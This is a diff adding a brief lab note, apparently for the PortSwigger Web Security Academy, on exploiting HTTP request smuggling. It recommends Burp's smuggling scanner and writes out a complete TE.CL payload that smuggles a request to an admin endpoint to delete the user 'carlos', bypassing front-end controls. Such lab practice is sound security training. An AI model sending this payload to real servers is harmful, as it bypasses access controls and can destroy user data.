@@ -1,0 +1,18 @@
+burp HTTP req smuggler will most probably identify the vulnerability 
+then just try different payloads:
+
+this works for TE.CL, bypass frontend controls:
+POST / HTTP/1.1
+Host: 0a0a0037034830aa822a3e7900060091.web-security-academy.net
+Content-length: 4
+Transfer-Encoding: chunked
+
+87
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
